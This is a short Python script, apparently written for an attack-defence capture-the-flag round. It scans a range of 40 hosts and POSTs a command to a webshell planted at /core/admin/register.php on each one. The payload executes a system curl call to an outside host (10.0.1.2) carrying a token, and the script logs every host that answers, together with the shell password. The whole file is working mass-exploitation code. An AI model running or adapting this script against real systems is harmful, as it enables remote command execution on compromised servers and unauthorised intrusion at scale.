#coding=utf-8
import requests
url_head="http://10.50."	#网段
url=""
shell_addr="/core/admin/register.php" #木马路径
passwd="xxxxxx"					#木马密码
port="80"
payload = {passwd: 'System(\'curl http://10.0.1.2?token=ZPWGYSLA\');'}
 
webshelllist=open("webshelllist.txt","w")
flag=open("firstround_flag.txt","w")
 
for i in range(0,40):
	url=url_head+str(i)+".3:"+port+shell_addr
	try:
		res=requests.post(url,payload,timeout=1)
		if res.status_code == requests.codes.ok:
			result = url+" connect shell sucess,flag is "+res.text
			print result
			print >>flag,result
			print >>webshelllist,url+","+passwd
		else:
			print "shell 404"
	except:
		print url+" connect shell fail"
 
webshelllist.close()
flag.close()